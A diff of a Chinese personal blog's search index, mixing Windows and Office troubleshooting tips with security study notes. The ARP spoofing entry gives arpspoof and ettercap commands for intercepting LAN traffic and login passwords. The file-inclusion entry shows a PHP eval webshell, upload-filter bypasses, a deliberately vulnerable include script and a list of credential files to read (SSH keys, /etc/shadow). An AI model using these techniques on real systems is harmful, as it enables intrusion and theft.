@@ -1,20 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[office使用问题]]></title>
+    <title><![CDATA[win10开机键盘无法使用问题]]></title>
+    <url>%2F2018%2F05%2F05%2F%E9%94%AE%E7%9B%98%E9%97%AE%E9%A2%98%2F</url>
+    <content type="text"><![CDATA[电脑开机外置键盘无法使用进入设备管理器发现键盘下的PC/AT 增强型PS/2键盘驱动为感叹号打开注册表，此时键盘无法使用，那就进入C盘Windows文件下双击regedit.exe文件打开注册表，依次进入HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}删除UpperFilters项在设备管理器下的键盘选项里删除PC/AT 增强型PS/2键盘卸载此设备，重新启动。此时安装驱动会提示错误代码10，该设备无法启动。 接着修改注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}添加字符串UpperFilters项，内容为kbdclass卸载设备，重新启动。重新启动后问题得以解决。]]></content>
+      <tags>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Windows使用问题]]></title>
     <url>%2F2018%2F04%2F22%2Foffice%2F</url>
-    <content type="text"><![CDATA[Office打开文件问题解决此问题，先左击该文件，再右击属性，右下角文件属性，解除锁定 问题解决 两行文字之间有空白段PDF转为word的文件，两行文字之间有空白段，但是按删除键却删除不了，这是由于文档中插入了分页符，我们需要删除分页符 删除分页符方法：第三步处，鼠标移至分页符前面按下Delete键即可删除此段空白]]></content>
+    <content type="text"><![CDATA[office的问题Office打开文件问题解决此问题，先左击该文件，再右击属性，右下角文件属性，解除锁定 问题解决 两行文字之间有空白段PDF转为word的文件，两行文字之间有空白段，但是按删除键却删除不了，这是由于文档中插入了分页符，我们需要删除分页符 删除分页符方法：第三步处，鼠标移至分页符前面按下Delete键即可删除此段空白 windows管理员权限删除文件依然删除不掉电脑在开机状态下按shift键，选择重启，开机进入高级选项模式，进入命令行模式，使用命令删除此类文件rd /s /q 文件夹del /F /S /Q 文件夹]]></content>
       <categories>
-        <category>Office</category>
+        <category>Windows</category>
       </categories>
       <tags>
-        <tag>Office</tag>
+        <tag>Windows</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[arp欺骗]]></title>
     <url>%2F2018%2F04%2F22%2Farp%2F</url>
-    <content type="text"><![CDATA[ARPARP（Address Resolution Protocol）是地址解析协议，是一种将IP地址转化成物理地址的协议。从IP地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP具体说来就是将网络层（也就是相当于OSI的第三层）地址解析为数据链路层（也就是相当于OSI的第二层）的物理地址(注:此处物理地址并不一定指MAC地址)。 ARP原理某机器A要向主机B发送报文，会查询本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会进行数据传输。如果未找到，则A广播一个ARP请求报文（携带主机A的IP地址Ia——物理地址Pa），请求IP地址为Ib的主机B回答物理地址Pb。网上所有主机包括B都收到ARP请求，但只有主机B识别自己的IP地址，于是向A主机发回一个ARP响应报文。其中就包含有B的MAC地址，A接收到B的应答后，就会更新本地的ARP缓存。接着使用这个MAC地址发送数据（由网卡附加MAC地址）。因此，本地高速缓存的这个ARP表是本地网络流通的基础，而且这个缓存是动态的。 ARP欺骗在局域网中，黑客经过收到ARP Request广播包，能够偷听到其它节点的 (IP, MAC) 地址, 黑客就伪装为A，告诉B (受害者) 一个假地址，使得B在发送给A 的数据包都被黑客截取；ARP欺骗是局域网中常用的攻击手段，其目的是对局域网中的目标机数据包进行转发，以实现中间人攻击，进而对数据监听、重放、钓鱼等攻击。 ARP实战在kali虚拟机下进行练习本机IP查看局域网中的IPfping -asg 192.168.231.0/24（局域网的网段）使用arpspoof工具进行欺骗输入arpspoof -i eth0 -t 192.168.0.102 -r 192.168.0.1 （网卡和网关可在ifconfig中查看）arpspoof -i 攻击机网卡 -t 目标主机IP 目标主机网关 开启流量转发echo 1 &gt;/proc/sys/net/ipv4/ip_dorward重新进行ARP欺骗，Driftnet -i eth0进行图片获取 抓取http协议上的登录账户和密码ettercap -Tq -i eth0]]></content>
+    <content type="text"><![CDATA[ARPARP（Address Resolution Protocol）是地址解析协议，是一种将IP地址转化成物理地址的协议。从IP地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP具体说来就是将网络层（也就是相当于OSI的第三层）地址解析为数据链路层（也就是相当于OSI的第二层）的物理地址(注:此处物理地址并不一定指MAC地址)。 ARP原理某机器A要向主机B发送报文，会查询本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会进行数据传输。如果未找到，则A广播一个ARP请求报文（携带主机A的IP地址Ia——物理地址Pa），请求IP地址为Ib的主机B回答物理地址Pb。网上所有主机包括B都收到ARP请求，但只有主机B识别自己的IP地址，于是向A主机发回一个ARP响应报文。其中就包含有B的MAC地址，A接收到B的应答后，就会更新本地的ARP缓存。接着使用这个MAC地址发送数据（由网卡附加MAC地址）。因此，本地高速缓存的这个ARP表是本地网络流通的基础，而且这个缓存是动态的。 ARP欺骗在局域网中，黑客经过收到ARP Request广播包，能够偷听到其它节点的 (IP, MAC) 地址, 黑客就伪装为A，告诉B (受害者) 一个假地址，使得B在发送给A 的数据包都被黑客截取；ARP欺骗是局域网中常用的攻击手段，其目的是对局域网中的目标机数据包进行转发，以实现中间人攻击，进而对数据监听、重放、钓鱼等攻击。 ARP实战在kali虚拟机下进行练习本机IP查看局域网中哪些主机在线fping -asg 192.168.231.0/24（局域网的网段）使用arpspoof工具进行欺骗，arpspoof -h，输入arpspoof -i eth0 -t 192.168.0.102 -r 192.168.0.1arpspoof -i 攻击机网卡 -t 目标主机IP 目标主机网关。此时目标机已经断网。ctrl+c停止断网攻击。 ARP欺骗开启流量转发echo 1 &gt;/proc/sys/net/ipv4/ip_dorward依然使用ARPSpoof工具，输入arpspoof -i eth0 -t 192.168.0.102 -r 192.168.0.1开始欺骗，接下来使用ettercap嗅探工具来抓取http协议上的登录账户和密码ettercap -Tq -i eth0 进行图片获取使用Driftnet -i eth0]]></content>
       <categories>
         <category>Wireless security</category>
       </categories>
@@ -70,7 +78,7 @@
   <entry>
     <title><![CDATA[文件包含漏洞]]></title>
     <url>%2F2018%2F04%2F09%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
-    <content type="text"><![CDATA[上传文件校验 客户端javascript校验（一般只校验后缀名） 服务端校验 文件头content-type字段校验（image/gif） 件内容头校验（GIF89a） 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定 php文件上传过程黑名单、白名单认证此文可以参考https://blog.csdn.net/hitwangpeng/article/details/47060671黑名单绕过可以测试，如1.aaa，1.php3,1.php4等进行测试 文件上传漏洞Burpsuite改包 0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候 上传文件为1.php，在burpsuite将其改为1.php+，发送到repeate，+号的十六进制为2d，在hex里面将其改为00，截断，点GO 上传文件为1.php.jpg，将jpg前面的.的十六进制（2e）改为00 上传一句话木马，1.php；&lt;?php eval($_POST[&quot;xxx&quot;]);?&gt;，在Burpsuite里面将其文件名改为1.jpg，还有将content-type字段改为image/jpg； 图片木马 Windows下制作图片一句话木马php写入图片copy 1.jpg/b+2.php/a New.jpg Linux下cat 1.jpg 2.php &gt; new.jpg点击上传，http://localhost/upload/upload.html上传成功后，使用文件包含程序，将jpg文件进行解析http://localhost/upload/1.php?page=./uploads/h.jpg?paragam(参数)=图片的绝对路径此时上传成功，php程序一句被即解析，本页面只会显示图片的源码，而不显示php程序，此时查看源代码php程序已经被注释接下来可以使用菜刀连接&nbsp;刚刚的网址，密码是php程序里面写入的参数1.php 12345678&lt;?php if(isset($_GET[&quot;page&quot;]))&#123; include $_GET[&quot;page&quot;]; &#125;else&#123; include &apos;2.php&apos;; &#125;?&gt; 2.php123&lt;?php echo &quot;niaho&quot;;?&gt; ###文件包含漏洞详解，转自https://blog.csdn.net/chence19871/article/details/51906523web安全文件包含漏洞，转自https://blog.csdn.net/hitwangpeng/article/details/45952625绕过姿势https://thief.one/2017/04/10/2/https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/]]></content>
+    <content type="text"><![CDATA[上传文件校验 客户端javascript校验（一般只校验后缀名） 服务端校验 文件头content-type字段校验（image/gif） 件内容头校验（GIF89a） 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定 php文件上传过程黑名单、白名单认证此文可以参考https://blog.csdn.net/hitwangpeng/article/details/47060671黑名单绕过可以测试，如1.aaa，1.php3,1.php4等进行测试 文件上传漏洞Burpsuite改包 0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候 上传文件为1.php，在burpsuite将其改为1.php+，发送到repeate，+号的十六进制为2d，在hex里面将其改为00，截断，点GO 上传文件为1.php.jpg，将jpg前面的.的十六进制（2e）改为00 上传一句话木马，1.php；&lt;?php eval($_POST[&quot;xxx&quot;]);?&gt;，在Burpsuite里面将其文件名改为1.jpg，还有将content-type字段改为image/jpg； 图片木马 Windows下制作图片一句话木马php写入图片copy 1.jpg/b+2.php/a New.jpg Linux下cat 1.jpg 2.php &gt; new.jpg点击上传，http://localhost/upload/upload.html上传成功后，使用文件包含程序，将jpg文件进行解析http://localhost/upload/1.php?page=./uploads/h.jpg?paragam(参数)=图片的绝对路径此时上传成功，php程序一句被即解析，本页面只会显示图片的源码，而不显示php程序，此时查看源代码php程序已经被注释接下来可以使用菜刀连接&nbsp;刚刚的网址，密码是php程序里面写入的参数1.php 12345678&lt;?php if(isset($_GET[&quot;page&quot;]))&#123; include $_GET[&quot;page&quot;]; &#125;else&#123; include &apos;2.php&apos;; &#125;?&gt; 2.php123&lt;?php echo &quot;niaho&quot;;?&gt; 敏感文件：1、Windows：C:boot.ini //查看系统版本C:WindowsSystem32inetsrvMetaBase.xml //IIS配置文件C:Windowsrepairsam //存储系统初次安装的密码C:Program Filesmysqlmy.ini //Mysql配置C:Program Filesmysqldatamysqluser.MYD //Mysql rootC:Windows\php.ini //php配置信息C:Windows\my.ini //Mysql配置信息 2、Linux：/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts/etc/passwd/etc/shadow/etc/my.cnf/etc/httpd/conf/httpd.conf/root/.bash_history/root/.mysql_history/proc/self/fd/fd[0-9]*(文件标识符)/proc/mounts/porc/config.gz 作者：spleated链接：https://www.jianshu.com/p/41bb503abe61來源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ###文件包含漏洞详解，转自https://blog.csdn.net/chence19871/article/details/51906523web安全文件包含漏洞，转自https://blog.csdn.net/hitwangpeng/article/details/45952625绕过姿势https://thief.one/2017/04/10/2/https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/]]></content>
       <categories>
         <category>Security</category>
       </categories>
